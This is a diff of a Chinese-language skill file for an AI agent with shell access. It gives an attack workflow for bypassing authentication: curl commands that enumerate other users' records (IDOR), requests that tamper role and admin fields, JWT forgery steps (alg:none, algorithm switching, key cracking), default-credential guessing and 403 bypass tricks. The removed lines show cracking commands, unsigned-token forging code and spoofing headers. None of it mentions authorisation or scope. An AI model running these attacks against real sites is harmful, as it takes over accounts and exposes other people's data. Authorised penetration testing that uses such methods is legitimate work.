@@ -1,6 +1,6 @@
 ---
 name: auth-bypass
-description: 认证绕过漏洞检测与利用。当目标存在登录功能、权限控制、JWT/Session 认证时使用。包括 IDOR、越权访问等。
+description: "检测、测试并利用认证绕过与授权缺陷漏洞，包括 IDOR 越权访问、JWT 令牌攻击、Session 劫持、权限参数篡改及路径/方法绕过。当目标存在登录功能、用户 ID 参数、JWT/Session 认证或角色权限控制时使用。"
 allowed-tools: Bash, Read, Write
 ---
 
@@ -8,30 +8,82 @@ allowed-tools: Bash, Read, Write
 
 绕过应用程序的认证和授权机制，获取未授权访问。
 
-## 常见指示器
+## 工作流程
 
-- 登录/注册功能
-- 用户 ID 参数（user_id=, uid=, id=）
-- JWT Token
-- Session Cookie
-- 角色/权限参数（role=, is_admin=, level=）
-- API 端点（/api/admin/, /api/user/）
+```
+侦察 → 识别认证类型 → 选择攻击路径 → 执行攻击 → 验证结果
+                                              ↓ 失败
+                                        尝试绕过技术 → 验证结果
+                                              ↓ 仍失败
+                                        切换攻击向量 → 回到选择攻击路径
+```
 
-## 检测方法
+### 阶段一：侦察与识别
 
-### 1. IDOR 测试
+1. 枚举所有 API 端点和可访问参数
+2. 识别认证机制类型（JWT / Session Cookie / Token / Basic Auth）
+3. 收集用户 ID 参数（user_id=, uid=, id=, account=）
+4. 查找角色/权限相关参数（role=, is_admin=, level=, group=）
+5. 检查前端 JS 中的隐藏 API 端点和参数
+
+**验证点**: 确认已发现至少一个认证机制和可测试的端点，再进入攻击阶段。
+
+### 阶段二：选择攻击路径
+
+根据识别到的认证类型选择攻击向量：
+
+| 认证类型 | 优先攻击 | 参考 |
+|---------|---------|------|
+| 用户 ID 参数 | IDOR 测试 | 本文件 |
+| JWT Token | 算法篡改/密钥爆破 | [JWT_ATTACKS.md](JWT_ATTACKS.md) |
+| Session Cookie | Session 固定/劫持 | [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md) |
+| 角色参数 | 权限参数篡改 | 本文件 |
+| 路径访问控制 | 路径/方法绕过 | [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md) |
+| 默认登录页 | 尝试常见默认凭据 | 使用已知常见默认凭据 |
+
+### 阶段三：执行攻击
+
+---
+
+## IDOR 测试（不安全的直接对象引用）
+
+### 水平越权 — 访问其他用户数据
 
 ```bash
-# 修改用户 ID
+# 用当前用户 session 访问其他用户资源
 curl "http://target.com/api/user/1" -H "Cookie: session=xxx"
 curl "http://target.com/api/user/2" -H "Cookie: session=xxx"
 
-# 修改资源 ID
+# 资源 ID 遍历
 curl "http://target.com/api/order/1001" -H "Cookie: session=xxx"
 curl "http://target.com/api/order/1002" -H "Cookie: session=xxx"
+
+# 文件名参数
+curl "http://target.com/download?file=user1.pdf" -H "Cookie: session=xxx"
+curl "http://target.com/download?file=user2.pdf" -H "Cookie: session=xxx"
 ```
 
-### 2. 权限参数测试
+**验证点**: 对比两个响应 — 如果返回了不属于当前用户的数据（不同 username、email、个人信息），确认 IDOR 存在。
+
+**如果返回 403/401**: 不要直接放弃，先尝试以下绕过：
+- 路径绕过技术（参见 [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md)）
+- 更换 HTTP 方法（GET → POST → PUT）
+- 参数污染: `/api/user?id=1` → `/api/user?id=1&id=2`
+- 数组语法: `/api/user?id[]=1&id[]=2`
+
+### 垂直越权 — 访问管理员功能
+
+```bash
+# 用普通用户凭据访问管理端点
+curl "http://target.com/api/admin/users" -H "Cookie: session=普通用户session"
+curl "http://target.com/admin/dashboard" -H "Cookie: session=普通用户session"
+```
+
+**验证点**: 检查响应是否包含管理员专属数据（用户列表、系统配置、操作日志等）。200 响应且含有效数据 = 越权成功。
+
+---
+
+## 权限参数篡改
 
 ```bash
 # 修改角色参数
@@ -43,210 +95,58 @@ curl -X POST "http://target.com/api/profile" \
 curl -X POST "http://target.com/api/profile" \
   -H "Cookie: session=xxx" \
   -d '{"name":"test","is_admin":true}'
+
+# 添加隐藏参数
+curl -X POST "http://target.com/api/profile" \
+  -H "Cookie: session=xxx" \
+  -d '{"name":"test","admin":true,"level":99}'
 ```
 
-## 攻击向量
+**验证点**: 发送篡改请求后，重新获取用户 profile 或访问受限端点，确认权限是否实际提升。仅凭 200 响应不够 — 必须验证后续请求是否获得了新权限。
 
-### IDOR (不安全的直接对象引用)
+---
 
-```bash
-# 水平越权 - 访问其他用户数据
-/api/user/1 → /api/user/2
-/api/order/1001 → /api/order/1002
-/download?file=user1.pdf → /download?file=user2.pdf
+## JWT 攻击
 
-# 垂直越权 - 访问管理员功能
-/api/user/profile → /api/admin/users
-/dashboard → /admin/dashboard
+详细攻击向量和工具用法参见 [JWT_ATTACKS.md](JWT_ATTACKS.md)。
 
-# 参数污染
-/api/user?id=1 → /api/user?id=1&id=2
-/api/user?id[]=1 → /api/user?id[]=1&id[]=2
-```
+核心流程：
+1. 解码 JWT，分析 header（alg）和 payload（sub, role, admin 字段）
+2. 尝试 alg:none 攻击 — 移除签名
+3. 如果是 RS256，尝试切换到 HS256 + 公钥签名
+4. 尝试弱密钥爆破
+5. 尝试修改 payload 中的权限字段
 
-### 权限参数篡改
+**验证点**: 使用修改后的 JWT 发送请求，检查响应是否返回了更高权限的数据或功能。对比修改前后的响应差异。
 
-```json
-// 修改角色
-{"username":"test","role":"user"} → {"username":"test","role":"admin"}
-
-// 修改权限标志
-{"username":"test","is_admin":false} → {"username":"test","is_admin":true}
-
-// 修改用户级别
-{"username":"test","level":1} → {"username":"test","level":99}
-
-// 添加隐藏参数
-{"username":"test"} → {"username":"test","admin":true}
-```
-
-### JWT 攻击
-
-```bash
-# 1. 修改算法为 none
-# Header: {"alg":"none","typ":"JWT"}
-# 移除签名部分
-
-# 2. 修改算法 RS256 → HS256
-# 使用公钥作为 HMAC 密钥签名
-
-# 3. 弱密钥爆破
-hashcat -a 0 -m 16500 jwt.txt wordlist.txt
-john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
-
-# 4. 修改 payload
-# 解码 → 修改 user_id/role → 重新编码
-```
-
-### Session 攻击
-
-```bash
-# Session 固定
-# 1. 获取未认证 session
-# 2. 诱导用户使用该 session 登录
-# 3. 使用同一 session 访问
-
-# Session 预测
-# 分析 session 生成规律，预测有效 session
-
-# Session 劫持
-# 通过 XSS 窃取 session cookie
-```
-
-### 默认凭据
-
-```
-admin:admin
-admin:password
-admin:123456
-root:root
-root:toor
-test:test
-guest:guest
-user:user
-administrator:administrator
-```
-
-### HTTP 方法绕过
-
-```bash
-# 尝试不同 HTTP 方法
-curl -X GET "http://target.com/admin"
-curl -X POST "http://target.com/admin"
-curl -X PUT "http://target.com/admin"
-curl -X DELETE "http://target.com/admin"
-curl -X PATCH "http://target.com/admin"
-curl -X OPTIONS "http://target.com/admin"
-curl -X HEAD "http://target.com/admin"
-
-# 方法覆盖
-curl -X POST "http://target.com/admin" -H "X-HTTP-Method-Override: PUT"
-curl -X POST "http://target.com/admin" -H "X-Method-Override: PUT"
-```
-
-### 路径绕过
-
-```bash
-# 大小写
-/admin → /Admin → /ADMIN
-
-# 路径遍历
-/admin → /./admin → /../admin/
-
-# URL 编码
-/admin → /%61%64%6d%69%6e
-
-# 双斜杠
-/admin → //admin → /admin//
-
-# 添加扩展名
-/admin → /admin.json → /admin.html
-
-# 添加参数
-/admin → /admin?anything → /admin#anything
-```
-
-## JWT 工具使用
-
-### jwt_tool
-
-```bash
-# 解码 JWT
-python3 jwt_tool.py <JWT>
-
-# 测试所有攻击
-python3 jwt_tool.py <JWT> -M at
-
-# 修改 payload
-python3 jwt_tool.py <JWT> -T
-
-# 爆破密钥
-python3 jwt_tool.py <JWT> -C -d wordlist.txt
-```
-
-### 手动 JWT 操作
-
-```python
-import base64
-import json
-
-# 解码
-def decode_jwt(token):
-    parts = token.split('.')
-    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
-    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
-    return header, payload
-
-# 编码 (无签名)
-def encode_jwt_none(payload):
-    header = {"alg": "none", "typ": "JWT"}
-    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
-    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
-    return f"{h.decode()}.{p.decode()}."
-```
+---
 
 ## 绕过技术
 
-### 前端验证绕过
+当直接攻击被拦截时，使用以下技术，详见 [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md)：
 
-```bash
-# 直接调用 API，绕过前端检查
-curl "http://target.com/api/admin/users" -H "Cookie: session=xxx"
+- **HTTP 方法绕过**: 切换 GET/POST/PUT/DELETE/PATCH，使用 X-HTTP-Method-Override 头
+- **路径绕过**: 大小写变形、URL 编码、双重编码、添加扩展名、双斜杠
+- **IP 限制绕过**: X-Forwarded-For 等头部伪造
+- **前端验证绕过**: 直接调用后端 API，修改响应中的权限标志
 
-# 修改响应中的权限标志
-# 使用 Burp 修改响应: {"is_admin":false} → {"is_admin":true}
-```
+---
 
-### IP 限制绕过
+## 常见指示器
 
-```bash
-# 添加 IP 头
-X-Forwarded-For: 127.0.0.1
-X-Real-IP: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-X-Client-IP: 127.0.0.1
-True-Client-IP: 127.0.0.1
-```
+识别目标是否存在认证绕过攻击面：
 
-### Referer 检查绕过
+- 登录/注册功能
+- URL 或请求体中的用户 ID 参数（user_id=, uid=, id=）
+- JWT Token（Authorization: Bearer ...）
+- Session Cookie（PHPSESSID, JSESSIONID 等）
+- 角色/权限参数（role=, is_admin=, level=）
+- API 端点模式（/api/admin/, /api/user/, /api/v1/）
 
-```bash
-# 添加 Referer 头
-Referer: http://target.com/admin
-Referer: http://target.com/
+## 最终验证清单
 
-# 空 Referer
-Referer:
-```
-
-## 最佳实践
-
-1. 先枚举所有 API 端点和参数
-2. 测试 IDOR：修改 ID 参数访问其他用户数据
-3. 测试权限参数：添加 role、is_admin 等参数
-4. 分析 JWT/Session：尝试修改或伪造
-5. 尝试不同 HTTP 方法和路径变形
-6. 检查前端 JS 中的隐藏 API 和参数
-7. 使用 Burp 拦截并修改请求/响应
+- [ ] 所有发现的 IDOR 都已通过实际数据泄露确认（而非仅凭状态码）
+- [ ] JWT 攻击已验证修改后的 token 可获得更高权限
+- [ ] 权限提升已通过访问受限功能确认（不只是参数返回变化）
+- [ ] 403/401 响应已尝试路径和方法绕过后再结论
+- [ ] 所有发现都有可复现的 PoC 命令
